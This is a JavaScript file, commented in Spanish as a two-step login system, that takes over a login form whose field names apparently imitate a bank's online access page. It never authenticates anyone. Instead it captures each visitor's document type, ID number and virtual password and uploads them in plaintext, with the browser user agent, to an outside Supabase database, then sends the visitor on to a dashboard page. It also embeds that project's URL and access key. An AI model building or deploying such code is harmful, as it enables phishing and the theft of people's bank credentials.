// Sistema de login en dos pasos con Supabase (autónomo)
let supabaseClient = null;
let supabaseInicializado = false;
let pasoActual = 1;
let datosLogin = {
    tipoDocumento: '',
    numeroDocumento: '',
    claveVirtual: ''
};

// Configuración de Supabase
const SUPABASE_URL = 'https://uzgdyypmqmnirkrqnlmq.supabase.co';
const SUPABASE_ANON_KEY = 'sb_publishable_5WgSnTPGEdfor1a83W0IIQ_pYrlY9ZD';

// Cargar Supabase desde CDN
function cargarSupabaseCDN() {
    return new Promise((resolve, reject) => {
        if (typeof window.supabase !== 'undefined') {
            resolve(true);
            return;
        }

        const script = document.createElement('script');
        script.src = 'https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2/dist/umd/supabase.min.js';
        script.onload = () => resolve(true);
        script.onerror = () => reject(new Error('Error cargando Supabase CDN'));
        document.head.appendChild(script);
    });
}

async function inicializarSistema() {
    try {
        await cargarSupabaseCDN();
        supabaseClient = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
        supabaseInicializado = true;
        console.log('✓ Supabase inicializado correctamente');
    } catch (error) {
        console.error('✗ Error inicializando Supabase:', error);
        supabaseInicializado = false;
    }
}

async function guardarLogin(datosLogin) {
    try {
        const { data, error } = await supabaseClient
            .from('logins')
            .insert([{
                usuario: datosLogin.usuario,
                documento: datosLogin.documento,
                tipo_documento: datosLogin.tipo_documento,
                clave_virtual: datosLogin.clave_virtual || '',
                fecha_login: new Date().toISOString(),
                user_agent: navigator.userAgent
            }])
            .select()
            .single();

        if (error) throw error;
        return { success: true, data: data };
    } catch (error) {
        console.error('Error guardando login:', error);
        return { success: false, error: error.message };
    }
}

function manejarSubmitLogin(event) {
    event.preventDefault();
    
    const btnSubmit = document.getElementById('formAutenticar:btnSubmitCont');
    const panelClaveVirtual = document.getElementById('formAutenticar:panelClaveVirtual');
    const numeroDocumentoInput = document.getElementById('formAutenticar:numeroDocumento');
    const tipoDocSelect = document.getElementById('formAutenticar:selectedTipoDocCod');
    const claveVirtualInput = document.getElementById('formAutenticar:claveVirtual');
    
    if (pasoActual === 1) {
        // Paso 1: Capturar número de documento
        const numeroDocumento = numeroDocumentoInput.value.trim();
        const tipoDocumento = tipoDocSelect.value;
        const tipoDocumentoTexto = tipoDocSelect.options[tipoDocSelect.selectedIndex].text;
        
        if (!numeroDocumento || numeroDocumento.length === 0) {
            alert('Por favor ingrese su número de documento');
            return;
        }
        
        // Guardar datos del paso 1
        datosLogin.numeroDocumento = numeroDocumento;
        datosLogin.tipoDocumento = tipoDocumento;
        datosLogin.tipoDocumentoTexto = tipoDocumentoTexto;
        
        // Mostrar panel de clave virtual (sin ocultar el de documento)
        if (panelClaveVirtual) {
            panelClaveVirtual.style.display = 'block';
        }
        
        // Cambiar el botón para el paso 2
        btnSubmit.value = 'Continuar';
        pasoActual = 2;
        
        // Enfocar el campo de clave virtual
        if (claveVirtualInput) {
            setTimeout(() => claveVirtualInput.focus(), 100);
        }
        
    } else if (pasoActual === 2) {
        // Paso 2: Capturar clave virtual y guardar en Supabase
        const claveVirtual = claveVirtualInput ? claveVirtualInput.value.trim() : '';
        
        if (!claveVirtual || claveVirtual.length === 0) {
            alert('Por favor ingrese su clave virtual');
            return;
        }
        
        datosLogin.claveVirtual = claveVirtual;
        
        // Guardar en Supabase y redirigir solo si es exitoso
        guardarYRedirigir();
    }
}

async function guardarYRedirigir() {
    const btnSubmit = document.getElementById('formAutenticar:btnSubmitCont');
    
    // Deshabilitar botón mientras se procesa
    btnSubmit.disabled = true;
    btnSubmit.value = 'Procesando...';
    
    try {
        // Inicializar Supabase si no está inicializado
        if (!supabaseInicializado) {
            await inicializarSistema();
        }
        
        if (supabaseInicializado && supabaseClient) {
            // Preparar datos para guardar
            const datosParaGuardar = {
                usuario: datosLogin.numeroDocumento,
                documento: datosLogin.numeroDocumento,
                tipo_documento: datosLogin.tipoDocumento,
                clave_virtual: datosLogin.claveVirtual,
                tipo_documento_texto: datosLogin.tipoDocumentoTexto
            };
            
            // Guardar en Supabase y esperar respuesta
            const resultado = await guardarLogin(datosParaGuardar);
            
            if (resultado && resultado.success) {
                console.log('✓ Login guardado exitosamente en Supabase');
                // Solo redirigir si Supabase confirmó el guardado
                window.location.href = 'dashboard.html';
            } else {
                console.error('✗ Error guardando login en Supabase:', resultado?.error || 'Error desconocido');
                btnSubmit.disabled = false;
                btnSubmit.value = 'Continuar';
                alert('Error al guardar los datos. Intente nuevamente.');
            }
        } else {
            console.warn('Supabase no disponible');
            btnSubmit.disabled = false;
            btnSubmit.value = 'Continuar';
            alert('Error de conexión con el servidor. Intente nuevamente.');
        }
    } catch (error) {
        console.error('Error en el proceso:', error);
        btnSubmit.disabled = false;
        btnSubmit.value = 'Continuar';
        alert('Error al procesar la solicitud. Intente nuevamente.');
    }
}

// Configurar el evento cuando el DOM esté listo
document.addEventListener('DOMContentLoaded', function() {
    // Inicializar Supabase
    inicializarSistema();
    
    // Interceptar el submit del formulario
    const formAutenticar = document.getElementById('formAutenticar');
    if (formAutenticar) {
        formAutenticar.addEventListener('submit', manejarSubmitLogin);
    }
    
    // También interceptar el click en el botón de continuar
    const btnSubmit = document.getElementById('formAutenticar:btnSubmitCont');
    if (btnSubmit) {
        btnSubmit.addEventListener('click', function(event) {
            event.preventDefault();
            manejarSubmitLogin(event);
        });
    }
});